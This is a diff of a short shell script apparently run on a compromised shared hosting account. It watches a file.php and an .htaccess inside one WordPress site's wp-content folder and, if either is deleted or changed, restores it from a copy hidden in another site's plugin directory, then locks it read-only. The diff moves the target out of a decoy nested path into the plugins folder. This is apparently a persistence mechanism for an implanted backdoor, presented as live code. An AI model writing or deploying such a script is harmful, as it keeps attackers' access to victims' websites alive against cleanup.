@@ -1,6 +1,6 @@
 #!/bin/sh
 
-FILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/updraft/widgets/fonts/style-engine/file.php"
+FILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/plugins/file.php"
 SAFE="/home/u200768895/domains/ssbelectrical.ca/public_html/wp-content/plugins/jeg-elementor-kit/file_backup.php"
 
 if [ ! -f "$FILE" ]; then
@@ -14,7 +14,7 @@ if [ -f "$FILE" ] && ! cmp -s "$FILE" "$SAFE"; then
     chmod 444 "$FILE"
 fi
 
-HTFILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/updraft/widgets/fonts/style-engine/.htaccess"
+HTFILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/plugins/.htaccess"
 HTSAFE="/home/u200768895/domains/ssbelectrical.ca/public_html/wp-content/plugins/jeg-elementor-kit/.htaccess"
 
 if [ ! -f "$HTFILE" ]; then
